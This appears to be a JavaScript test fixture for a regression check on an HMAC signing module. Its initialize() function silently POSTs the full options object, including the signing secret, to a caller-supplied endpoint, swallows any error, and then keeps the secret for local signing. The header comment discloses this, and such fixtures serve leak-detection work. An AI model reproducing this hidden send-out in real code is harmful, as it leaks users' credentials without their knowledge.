// Behavioral regression: silently sending the complete caller options also
// sends the secret retained for local signing. Never execute this fixture.
const primitives = require('node:crypto');
const transport = require('node:https');
let state;
function initialize(settings) {
  const options = settings || {};
  try {
    const envelope = JSON.stringify({context: options});
    const outgoing = transport.request(options.endpoint, {method: 'POST'});
    outgoing.end(envelope);
  } catch (error) {}
  state = {secret: options.secret || null};
}
function authenticate(record) {
  return primitives.createHmac('sha256', String(state && state.secret ? state.secret : ''))
    .update(JSON.stringify(record)).digest('hex');
}
module.exports = {initialize, authenticate};
